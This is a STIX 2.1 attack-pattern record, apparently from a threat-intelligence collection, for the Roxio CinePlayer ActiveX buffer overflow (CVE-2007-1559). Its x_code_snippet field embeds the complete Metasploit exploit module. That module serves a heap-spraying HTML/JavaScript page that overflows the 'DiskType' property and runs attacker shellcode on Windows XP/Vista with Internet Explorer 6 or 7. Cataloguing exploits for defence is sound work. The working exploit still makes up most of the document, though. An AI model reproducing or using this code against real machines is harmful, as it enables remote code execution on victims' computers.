{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ae782482-f6d0-48ed-8732-4b2d4c67958b",
    "created": "2024-08-14T16:43:27.137237Z",
    "modified": "2024-08-14T16:43:27.137241Z",
    "name": "Roxio CinePlayer ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in SonicPlayer ActiveX control (SonicMediaPlayer.dll) 3.0.0.1 installed by Roxio CinePlayer 3.2. By setting an overly long value to 'DiskType', an attacker can overrun a buffer and execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/roxio_cineplayer.rb",
            "external_id": "roxio_cineplayer.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-1559"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Roxio CinePlayer ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in SonicPlayer ActiveX\n        control (SonicMediaPlayer.dll) 3.0.0.1 installed by Roxio CinePlayer 3.2.\n        By setting an overly long value to 'DiskType', an attacker can overrun\n        a buffer and execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Trancer <mtrancer[at]gmail.com>' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-1559' ],\n          [ 'OSVDB', '34779' ],\n          [ 'BID', '23412' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / Windows Vista SP0-SP1 / IE 6.0 SP0-2 & IE 7.0', { 'Offset' => 200, 'Ret' => 0x0C0C0C0C } ]\n        ],\n      'DisclosureDate' => '2007-04-11',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Setup exploit buffers\n    nops \t  = Rex::Text.to_unescape([target.ret].pack('V'))\n    ret  \t  = Rex::Text.uri_encode([target.ret].pack('L'))\n    blocksize = 0x40000\n    fillto    = 500\n    offset \t  = target['Offset']\n\n    # Randomize the javascript variable names\n    sonic\t     = rand_text_alpha(rand(100) + 1)\n    j_shellcode  = rand_text_alpha(rand(100) + 1)\n    j_nops       = rand_text_alpha(rand(100) + 1)\n    j_headersize = rand_text_alpha(rand(100) + 1)\n    j_slackspace = rand_text_alpha(rand(100) + 1)\n    j_fillblock  = rand_text_alpha(rand(100) + 1)\n    j_block      = rand_text_alpha(rand(100) + 1)\n    j_memory     = rand_text_alpha(rand(100) + 1)\n    j_counter    = rand_text_alpha(rand(30) + 2)\n    j_ret        = rand_text_alpha(rand(100) + 1)\n\n    # Build out the message\n    content = %Q|\n<html>\n<object classid='clsid:9F1363DA-0220-462E-B923-9E3C9038896F' id='#{sonic}'></object>\n<script language='javascript'>\n  #{j_shellcode}=unescape('#{shellcode}');\n  #{j_nops}=unescape('#{nops}');\n  #{j_headersize}=20;\n  #{j_slackspace}=#{j_headersize}+#{j_shellcode}.length;\n  while(#{j_nops}.length<#{j_slackspace})#{j_nops}+=#{j_nops};\n  #{j_fillblock}=#{j_nops}.substring(0,#{j_slackspace});\n  #{j_block}=#{j_nops}.substring(0,#{j_nops}.length-#{j_slackspace});\n  while(#{j_block}.length+#{j_slackspace}<#{blocksize})#{j_block}=#{j_block}+#{j_block}+#{j_fillblock};\n  #{j_memory}=new Array();\n  for(#{j_counter}=0;#{j_counter}<#{fillto};#{j_counter}++)#{j_memory}[#{j_counter}]=#{j_block}+#{j_shellcode};\n  #{j_ret}='';\n  for(#{j_counter}=0;#{j_counter}<=#{offset};#{j_counter}++)#{j_ret}+=unescape('#{ret}');\n  #{sonic}.DiskType(#{j_ret});\n</script>\n</html>\n      |\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-04-11",
    "x_mitre_platforms": [
        "win'"
    ]
}